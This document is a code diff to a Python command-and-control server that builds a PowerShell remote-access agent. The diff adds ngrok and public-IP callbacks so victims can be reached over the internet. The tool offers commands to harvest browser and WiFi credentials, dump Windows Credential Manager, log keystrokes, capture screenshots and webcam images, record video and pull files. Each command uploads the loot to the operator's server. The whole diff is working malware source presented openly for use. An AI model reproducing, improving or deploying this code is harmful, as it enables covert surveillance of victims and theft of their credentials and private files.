@@ -52,9 +52,13 @@ class SessionManager:
                 None
             )
             if existing:
-                existing.ip     = ip   # update IP in case it changed
-                existing.cwd    = cwd
-                existing.status = "Running"
+                existing.ip          = ip   # update IP in case it changed (e.g. after reconnect)
+                existing.cwd         = cwd
+                existing.status      = "Running"
+                # Reset any stale pending task so an old concurrent agent
+                # that may still be polling can't steal or corrupt it.
+                existing.current_task = ""
+                existing.task_result  = None
                 return existing
             sid = self._next_id()
             ts  = time.strftime("%Y-%m-%d %H:%M:%S")
@@ -94,7 +98,9 @@ class SessionManager:
 # ── Global state ──────────────────────────────────────────────────────────────
 SM:                SessionManager  = SessionManager()
 ACTIVE_SESSION_ID: Optional[str]  = None
-LHOST                             = "0.0.0.0"
+LHOST                             = "0.0.0.0"  # bind address — always all interfaces
+CALLBACK_HOST                     = "0.0.0.0"  # IP baked into payload (set at startup)
+CALLBACK_URL                      = ""
 LPORT                             = 8080
 PATH_SEP                          = "---PATH_SEP---"
 _uvicorn_server                   = None
@@ -216,7 +222,7 @@ _PIC_B64 = base64.b64encode(_PIC_SRC.encode('utf-16-le')).decode()
 
 
 # ── Payload generator ─────────────────────────────────────────────────────────
-def generate_ps_payload(ip: str, port: int) -> str:
+def generate_ps_payload(url: str) -> str:
     """
     Compact single-string PS agent — no backtick line-continuation.
     Now captures X-Session-ID from the check-in response and sends it
@@ -228,12 +234,13 @@ def generate_ps_payload(ip: str, port: int) -> str:
         f"$info=\"$env:COMPUTERNAME|\"+$(whoami).Trim()+\"|$currentPath\";"
         f"$b64=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info));"
         f"$sid='';"
-        f"try{{$cr=Invoke-WebRequest -Uri 'http://{ip}:{port}/checkin' -Method Post -Body $b64 -ContentType 'text/plain' -UseBasicParsing;"
+        "$gH=@{\"ngrok-skip-browser-warning\"=\"true\"};"
+        f"try{{$cr=Invoke-WebRequest -Uri '{url}/checkin' -Method Post -Body $b64 -ContentType 'text/plain' -Headers $gH -UseBasicParsing;"
         f"if($cr.Headers['X-Session-ID']){{$sid=$cr.Headers['X-Session-ID']}}}}catch{{}};"
         f"while($true){{"
         f"try{{"
-        f"$h=@{{\"X-Agent-CWD\"=$currentPath;\"X-Session-ID\"=$sid}};"
-        f"$r=Invoke-WebRequest -Uri 'http://{ip}:{port}/get_task' -Headers $h -UseBasicParsing;"
+        f"$h=@{{\"X-Agent-CWD\"=$currentPath;\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
+        f"$r=Invoke-WebRequest -Uri '{url}/get_task' -Headers $h -UseBasicParsing;"
         f"$cmd=$r.Content.Trim();"
         f"if($cmd){{"
         f"$out=\"\";"
@@ -249,8 +256,8 @@ def generate_ps_payload(ip: str, port: int) -> str:
         f"$currentPath=(Get-Location).Path"
         f"}};"
         f"$b64r=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out+'{PATH_SEP}'+$currentPath));"
-        f"$sh=@{{\"X-Session-ID\"=$sid}};"
-        f"Invoke-WebRequest -Uri 'http://{ip}:{port}/submit_result' -Method Post -Body $b64r -ContentType 'text/plain' -Headers $sh -UseBasicParsing|Out-Null"
+        f"$sh=@{{\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
+        f"Invoke-WebRequest -Uri '{url}/submit_result' -Method Post -Body $b64r -ContentType 'text/plain' -Headers $sh -UseBasicParsing|Out-Null"
         f"}}}}catch{{}};"
         f"Start-Sleep -Seconds 3"
         f"}}"
@@ -405,8 +412,11 @@ async def get_task(request: Request):
     if s is None or s.status == "Stopped":
         return Response(content="", media_type="text/plain")
     assert s is not None  # type narrowing for Pyre2
+    # Only update CWD from the header if the session has NO task currently
+    # queued or running — prevents a stale background agent from silently
+    # overwriting CWD mid-command and causing directory jumps.
     cwd = request.headers.get("X-Agent-CWD", "").strip()
-    if cwd:
+    if cwd and not s.current_task:
         s.cwd = cwd
     if s.current_task:
         t              = s.current_task
@@ -425,14 +435,18 @@ async def submit_result(request: Request):
     if s is None:
         return {"status": "ok"}
     body = await request.body()
+    if not body:            # agent sent empty result (no-output command) — just ACK
+        return {"status": "ok"}
     try:
         dec  = base64.b64decode(body).decode('utf-8', errors='ignore').strip()
+        if not dec:
+            return {"status": "ok"}
         out, cwd = parse_agent_response(dec)
         s.task_result = out or "(no output)"
         if cwd:
             s.cwd = cwd
-    except Exception as e:
-        s.task_result = f"[!] Decode error: {e}"
+    except Exception:
+        s.task_result = "(no output)"   # swallow decode errors, never 500
     return {"status": "ok"}
 
 
@@ -491,6 +505,14 @@ def start_listener(host: str, port: int):
 
 # ── Session registry helpers ──────────────────────────────────────────────────
 def _print_sessions():
+    try:
+        import socket as _s
+        with _s.socket(_s.AF_INET, _s.SOCK_DGRAM) as _sk:
+            _sk.connect(("8.8.8.8", 80))
+            _local_ip = _sk.getsockname()[0]
+    except Exception:
+        _local_ip = ""
+
     sessions = SM.list_all()
     if not sessions:
         print("  [*] No active sessions yet.")
@@ -507,16 +529,44 @@ def _print_sessions():
     print(f"{P}  ╠══════════╬══════════════════════════════╬═══════════════════╬═══════════╣")
     for s in sessions:
         col  = G if s.status == "Running" else R
+        local_marker = f" {R}[LOCAL]{X}" if s.ip in ("127.0.0.1", _local_ip) else ""
         info = f"{s.hostname} / {s.username}"
         print(
-            f"{P}  ║{W} {s.session_id:<8} {P}║{W} {info:<28} {P}║{W} {s.ip:<17} {P}║{col} {s.status:<9} {P}║"
+            f"{P}  ║{W} {s.session_id:<8} {P}║{W} {info:<28} {P}║{W} {s.ip:<17} {P}║{col} {s.status:<9} {P}║{local_marker}"
         )
     print(f"{P}  ╚══════════╩══════════════════════════════╩═══════════════════╩═══════════╝{X}\n")
 
 
+# ── IP detection ─────────────────────────────────────────────────────────────
+def _detect_ips() -> tuple:
+    """Return (local_ip, public_ip) strings. Falls back gracefully on errors."""
+    import urllib.request
+
+    # Local IP — open a UDP socket, read the OS-assigned source address
+    local_ip = "unavailable"
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+    except Exception:
+        pass
+
+    # Public IP — try two services with a short timeout
+    public_ip = "unavailable"
+    for url in ("https://api.ipify.org", "https://ipecho.net/plain"):
+        try:
+            with urllib.request.urlopen(url, timeout=4) as r:
+                public_ip = r.read().decode().strip()
+            break
+        except Exception:
+            continue
+
+    return local_ip, public_ip
+
+
 # ── Main ──────────────────────────────────────────────────────────────────────
 def main():
-    global ACTIVE_SESSION_ID, LHOST, LPORT, _listener_thread
+    global ACTIVE_SESSION_ID, LHOST, CALLBACK_HOST, LPORT, _listener_thread, CALLBACK_URL
 
     os.system("")  # Enable ANSI escape sequences on Windows terminals
     C = "\033[38;5;51m"   # Cyan
@@ -537,27 +587,43 @@ def main():
 {P}                           | |                  
 {M}                           |_|                  
 
-{M}               [{W}made with {R}♥{W} by {C}arxncodes & aashay{M}]
+{M}           [{W}made with {R}♥{W} by {C}arxncodes & aashay{M}]
 
 {C}    ╔══════════════════ {W}SESSION COMMANDS{C} ════════════════════╗
-{M}    ║  {W}list-sessions                connect <session_id>  {M}║
-{C}    ║  {W}session-exit                 session-stop <id>     {C}║
+{M}    ║  {W}list-sessions                connect <session_id>     {M}║
+{C}    ║  {W}session-exit                 session-stop <id>        {C}║
 {P}    ╠══════════════════ {W}AGENT COMMANDS{P} ══════════════════════╣
-{M}    ║  {W}screenshot  pic  harvest-browsers   download        {M}║
-{C}    ║  {W}dump / dump-all  dump-os  dump-wifi  dump-credman   {C}║
-{M}    ║  {W}key-capture      exit-capture       kill-agent      {M}║
-{C}    ║  {W}livecam-start    livecam-stop       livecam-save    {C}║
-{P}    ╚════════════════════════════════════════════════════════╝{X}
+{M}    ║  {W}screenshot  pic  harvest-browsers   download          {M}║
+{C}    ║  {W}dump / dump-all  dump-os  dump-wifi  dump-credman     {C}║
+{M}    ║  {W}key-capture      exit-capture       kill-agent        {M}║
+{C}    ║  {W}livecam-start    livecam-stop       livecam-save      {C}║
+{P}    ╚════════════════════════════════════════════════════════{P}╝
     """)
 
-    h = input(f"{P}[{C}?{P}] {W}LHOST [{C}0.0.0.0{W}]: {X}").strip()
-    LHOST = h if h else "0.0.0.0"
+    # ── Detect IPs and show startup prompt ────────────────────────────────────
+    print(f"\n{P}[{M}*{P}] {W}Detecting network addresses...{X}")
+    local_ip, public_ip = _detect_ips()
+    print(f"{P}[{C}>{P}] {W}Local  IP : {G}{local_ip:<20}{W}  ← LAN/VM targets")
+    print(f"{P}[{C}>{P}] {W}Public IP : {G}{public_ip:<20}{W}  ← internet targets {M}(needs port forwarding on router){X}\n")
+
+    h = input(f"{P}[{C}?{P}] {W}CALLBACK HOST (or ngrok URL) [{C}{public_ip}{W}]: {X}").strip()
+    CALLBACK_HOST = h if h else public_ip
     p = input(f"{P}[{C}?{P}] {W}LPORT [{C}8080{W}]: {X}").strip()
     LPORT = int(p) if p else 8080
+    
+    if CALLBACK_HOST.startswith("http://") or CALLBACK_HOST.startswith("https://"):
+        CALLBACK_URL = CALLBACK_HOST
+        if CALLBACK_URL.endswith("/"):
+            CALLBACK_URL = CALLBACK_URL[:-1]
+    else:
+        CALLBACK_URL = f"http://{CALLBACK_HOST}:{LPORT}"
 
-    payload = generate_ps_payload(LHOST, LPORT)
-    print(f"\n{P}[{G}+{P}] {W}Payload ({M}http://{LHOST}:{LPORT}{W}):\n{C}{payload}{X}\n")
-    print(f"{P}[{M}*{P}] {W}Listener starting — waiting for agent check-ins ...{X}\n")
+    # Server always binds 0.0.0.0 — accepts connections on ALL interfaces
+    LHOST = "0.0.0.0"
+
+    payload = generate_ps_payload(CALLBACK_URL)
+    print(f"\n{P}[{G}+{P}] {W}Payload ({M}{CALLBACK_URL}{W}):\n{C}{payload}{X}\n")
+    print(f"{P}[{M}*{P}] {W}Listener bound on {C}0.0.0.0:{LPORT}{W} — waiting for agent check-ins ...{X}\n")
 
     _listener_thread = threading.Thread(target=start_listener, args=(LHOST, LPORT), daemon=True)
     _listener_thread.start()
@@ -663,7 +729,7 @@ def main():
             # screenshot
             if c == "screenshot":
                 print("[*] Capturing screen...")
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 ps = (
                     "$t=\"$env:TEMP\\sc$(Get-Date -Format 'yyyyMMddHHmmss').png\";"
                     "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
@@ -674,7 +740,8 @@ def main():
                     "$g.Dispose();"
                     "$bmp.Save($t,[System.Drawing.Imaging.ImageFormat]::Png);"
                     "$bmp.Dispose();"
-                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$t);"
+                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                    f"try{{$wcu.UploadFile('{url}/upload',$t)}}catch{{}};$wcu.Dispose();"
                     "Remove-Item $t -Force;"
                     "Write-Output '[+] Screenshot uploaded.'"
                 )
@@ -684,7 +751,7 @@ def main():
             # harvest-browsers
             if c == "harvest-browsers":
                 print("[*] Harvesting browser/WiFi/cred data...")
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 ps = (
                     "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                     "$d=\"$env:TEMP\\harv_$ts\";"
@@ -705,7 +772,8 @@ def main():
                     "$fp=\"$($_.Value)\\$f\";if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
                     "$zip=\"$env:TEMP\\harv_$ts.zip\";"
                     "Compress-Archive -Path $d -DestinationPath $zip -Force;"
-                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$zip);"
+                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                    f"try{{$wcu.UploadFile('{url}/upload',$zip)}}catch{{}};$wcu.Dispose();"
                     "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
                     "Write-Output '[+] Harvest zip uploaded → ./exfil/'"
                 )
@@ -856,18 +924,18 @@ def main():
                     "elseif($i -ge 48 -and $i -le 57){$ch=if($sh){$sm[$i]}else{[char]$i}}"
                     "elseif($i -ge 96 -and $i -le 105){$ch=[char]($i-48)}"
                     "elseif($sm.ContainsKey($i)){$ch=if($sh){$sm[$i]}else{$nm[$i]}};"
-                    "if($ch -ne $null){[System.IO.File]::AppendAllText($lp,[string]$ch)}}}};"
+                    "if($ch -ne $null){[System.IO.File]::AppendAllText($lp,[string]$ch)}}}}};"
                     "$j=Start-Job -ScriptBlock $sb -ArgumentList $log;"
                     "\"$($j.Id)|$log\"|Set-Content \"$env:TEMP\\kl_job.txt\";"
                     "Write-Output \"[+] Keylogger started (Job $($j.Id)). Type exit-capture to stop.\""
                 )
-                print(_send(ps, timeout=20.0))
+                print(_send_encoded(ps, timeout=25.0))
                 continue
 
             # exit-capture
             if c == "exit-capture":
                 print("[*] Stopping keylogger and uploading log...")
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 ps = (
                     "if(-not(Test-Path \"$env:TEMP\\kl_job.txt\")){Write-Output '[-] No keylogger running.'}else{"
                     "$parts=(Get-Content \"$env:TEMP\\kl_job.txt\").Split('|');"
@@ -875,7 +943,8 @@ def main():
                     "Stop-Job -Id $jId -EA 0;Remove-Job -Id $jId -Force -EA 0;"
                     "Remove-Item \"$env:TEMP\\kl_job.txt\" -Force -EA 0;"
                     "if(Test-Path $lpath){"
-                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$lpath);"
+                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                    f"try{{$wcu.UploadFile('{url}/upload',$lpath)}}catch{{}};$wcu.Dispose();"
                     "Remove-Item $lpath -Force -EA 0;"
                     "Write-Output '[+] Keylog uploaded → ./exfil/'"
                     "}else{Write-Output '[-] No log file found.'}}"
@@ -939,7 +1008,7 @@ def main():
             # livecam-save
             if c == "livecam-save":
                 print("[*] Stopping recording and saving locally...")
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 ps = (
                     "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
                     "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
@@ -951,7 +1020,8 @@ def main():
                     "Start-Sleep -Seconds 1;"
                     "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
                     "if(Test-Path $avi){"
-                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$avi);"
+                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                    f"try{{$wcu.UploadFile('{url}/upload',$avi)}}catch{{}};$wcu.Dispose();"
                     "Remove-Item $avi -Force -EA 0;"
                     "Write-Output '[+] Recording saved → ./recordings/'"
                     "}else{Write-Output '[-] AVI file not found.'}}"
@@ -963,7 +1033,7 @@ def main():
             if c == "pic":
                 print("[*] Activating camera (2 s warm-up)...")
                 whu_raw = input("[?] Discord webhook URL (Enter to save locally): ").strip()
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 b64 = _PIC_B64
                 common = (
                     "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
@@ -994,7 +1064,8 @@ def main():
                 else:
                     ps = (
                         common +
-                        f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$png)|Out-Null;"
+                        "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                        f"try{{$wcu.UploadFile('{url}/upload',$png)}}catch{{}};$wcu.Dispose();"
                         "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                         "Write-Output '[+] Photo saved → ./images/'"
                         "}else{Write-Output '[-] No camera — check driver is installed.'}"
@@ -1010,11 +1081,12 @@ def main():
                 else:
                     sep = "" if s.cwd.endswith("\\") else "\\"
                     tf  = f"{s.cwd}{sep}{raw}"
-                lh, lp = LHOST, LPORT
+                url = CALLBACK_URL
                 sf = tf.replace("'", "''")
                 ps = (
                     f"$fp='{sf}';"
-                    f"if(Test-Path $fp){{(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$fp)|Out-Null;"
+                    "if(Test-Path $fp){$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
+                    f"try{{$wcu.UploadFile('{url}/upload',$fp)}}catch{{}};$wcu.Dispose();"
                     f"Write-Output \"[+] Sent: $fp\"}}"
                     f"else{{Write-Output \"[-] Not found: $fp\"}}"
                 )
